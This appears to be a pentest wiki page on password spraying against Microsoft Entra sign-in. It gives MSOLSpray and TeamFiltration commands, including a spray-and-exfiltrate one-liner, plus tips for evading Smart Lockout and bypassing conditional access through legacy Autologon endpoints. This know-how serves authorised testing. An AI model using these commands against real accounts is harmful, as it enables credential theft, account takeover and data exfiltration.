---
title: "Password spraying: guessing credentials within Smart Lockout"
description: "Spraying credentials against Entra sign-in endpoints while respecting Smart Lockout: MSOLSpray and AADInternals against Graph, Autologon, and legacy-auth endpoints."
keywords:
  - password spraying
  - MSOLSpray
  - Smart Lockout
  - legacy authentication
  - Autologon
---

# Password spraying

With a validated user list, a low-and-slow spray of one or two common passwords across many accounts finds the weak credential without locking everyone out. The endpoint matters: some report Smart Lockout and MFA state, and legacy endpoints behave differently from modern ones.

## Spraying

```powershell
# MSOLSpray against the Azure AD authentication endpoint; reports MFA/locked/disabled
Invoke-MSOLSpray -UserList users.txt -Password 'Autumn2026!'
```

```bash
# TeamFiltration spray + exfil
teamfiltration --spray --exfil --users users.txt --password 'Autumn2026!'
```

## Exploitation notes

- Keep to one password per lockout window across the whole list; Smart Lockout tracks per-account bad attempts, not per-source.
- MSOLSpray flags accounts that are valid-but-MFA, disabled, or locked, which triages the hits for you.
- The **Autologon** and other legacy-auth endpoints sometimes bypass conditional-access policies scoped to modern auth, so a credential that fails interactively may still work there.

## Tools

- **MSOLSpray** (dafthack): spray with state reporting.
- **TeamFiltration** / **o365spray**: spray and exfiltrate.
- **AADInternals**: sign-in against multiple endpoints.

## References

- [MSOLSpray (dafthack)](https://github.com/dafthack/MSOLSpray)
- [TeamFiltration (Flangvik)](https://github.com/Flangvik/TeamFiltration)
- [HackTricks Cloud: Azure password spraying](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
